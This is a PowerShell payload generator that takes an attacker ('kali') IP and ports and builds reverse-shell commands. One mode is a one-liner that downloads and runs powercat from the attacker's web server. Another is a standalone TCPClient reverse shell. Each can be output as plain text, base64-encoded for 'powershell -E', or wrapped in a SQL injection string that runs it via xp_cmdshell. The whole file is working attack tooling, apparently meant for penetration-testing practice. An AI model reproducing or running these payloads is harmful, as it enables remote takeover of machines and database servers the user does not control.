param(
    [string]$kaliip,
    [string]$httpport,
    [string]$rshellport,
    [string]$independent,
    [string]$whattodo
)


if ([string]::IsNullOrWhiteSpace($kaliip) -or [string]::IsNullOrWhiteSpace($httpport) -or [string]::IsNullOrWhiteSpace($rshellport) -or [string]::IsNullOrWhiteSpace($independent) -or [string]::IsNullOrWhiteSpace($whattodo)) {
    throw "Please provide values for the inputs."
}

if ($independent -eq "false") {
    $Text = "IEX(New-Object System.Net.WebClient).DownloadString('http://${kaliip}:${httpport}/powercat.ps1');powercat -c ${kaliip} -p ${rshellport} -e powershell"
} else {
    $Text = "`$client = New-Object System.Net.Sockets.TCPClient('${kaliip}',${rshellport});`$stream = `$client.GetStream();[byte[]]`$bytes = 0..65535|%{0};while((`$i = `$stream.Read(`$bytes, 0, `$bytes.Length)) -ne 0){;`$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$bytes,0,`$i);`$sendback = (iex `". { `$data } 2>&1`" | Out-String ); `$sendback2 = `$sendback + 'PS ' + (pwd).Path + '> ';`$sendbyte = ([text.encoding]::ASCII).GetBytes(`$sendback2);`$stream.Write(`$sendbyte,0,`$sendbyte.Length);`$stream.Flush()};`$client.Close()"
}
$base64 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Text))
if ($whattodo -eq "b64" -or $whattodo -eq "dump") {
    $base64
} elseif ($whattodo -eq "plain" -or $whattodo -eq "text") {
    $Text
} elseif ($whattodo -eq "sql" -or $whattodo -eq "xpcmd" -or $whattodo -eq "xpcmdshell") {
    "' EXEC xp_cmdshell 'powershell -E ${base64}';-- //"
}
